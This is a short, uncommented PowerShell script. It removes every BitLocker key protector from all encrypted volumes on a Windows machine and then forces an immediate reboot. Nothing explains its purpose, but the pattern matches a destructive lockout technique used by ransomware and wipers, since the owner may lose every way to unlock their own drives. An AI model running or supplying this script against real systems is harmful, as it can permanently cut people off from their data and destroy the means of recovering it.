foreach ($MountPoint in (Get-BitLockerVolume | Select-Object -ExpandProperty MountPoint -Unique)) {
    $KeyProtectors = (Get-BitLockerVolume -MountPoint $MountPoint).KeyProtector
    foreach($KeyProtector in $KeyProtectors){
        Remove-BitLockerKeyProtector -MountPoint $MountPoint -KeyProtectorId $KeyProtector.KeyProtectorId
    }
}
shutdown -r -t 0 -f
